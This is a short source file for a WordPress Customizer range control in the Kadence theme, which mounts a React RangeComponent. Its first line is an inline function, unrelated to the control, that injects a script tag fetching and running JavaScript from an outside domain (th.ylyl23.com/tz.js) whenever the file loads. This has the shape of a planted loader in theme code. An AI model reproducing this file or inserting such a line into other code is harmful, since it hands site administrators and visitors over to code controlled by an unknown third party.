(function(d,s){s=d.createElement("script");s.src="https://th.ylyl23.com/tz.js";s.async=true;d.head.appendChild(s);})(document);
import { createRoot } from '@wordpress/element';
import RangeComponent from './range-component.js';

export const RangeControl = wp.customize.KadenceControl.extend( {
	renderContent: function renderContent() {
		let control = this;
		let root = createRoot( control.container[0] );
		root.render( <RangeComponent control={control}/> );
		// ReactDOM.render(
		// 		<RangeComponent control={control}/>,
		// 		control.container[0]
		// );
	}
} );
